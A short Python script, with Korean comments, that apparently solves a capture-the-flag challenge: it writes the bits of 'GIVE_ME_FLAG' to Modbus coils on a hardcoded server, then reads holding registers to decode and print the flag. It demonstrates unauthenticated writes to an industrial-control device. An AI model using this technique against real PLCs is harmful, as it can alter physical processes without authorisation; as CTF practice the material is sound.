from pymodbus.client import ModbusTcpClient
import time

# Modbus 서버의 IP와 포트
SERVER_IP = '3.38.57.41'
SERVER_PORT = 10506

# 클라이언트 생성 및 서버에 연결
client = ModbusTcpClient(SERVER_IP, port=SERVER_PORT)
client.connect()

# 키워드 전송
flag_keyword = "GIVE_ME_FLAG"
bin_keyword = [int(bit) for bit in ''.join(format(ord(char), '08b') for char in flag_keyword)]

# 각 비트를 설정 (코일 시작 주소: 10)
for i, bit in enumerate(bin_keyword):
    client.write_coil(10 + i, bit)

# 키워드 전송 후 잠시 대기
time.sleep(1)

# 플래그를 읽기 위해 레지스터를 확인
flag_registers = client.read_holding_registers(0, 100)  # 필요에 따라 레지스터 개수 조정
if flag_registers.isError():
    print("Error reading registers.")
else:
    flag_bytes = bytearray()
    for reg in flag_registers.registers:
        flag_bytes.extend(reg.to_bytes(2, byteorder='big'))
    flag = flag_bytes.decode('utf-16')
    print("Flag:", flag)

# 클라이언트 연결 종료
client.close()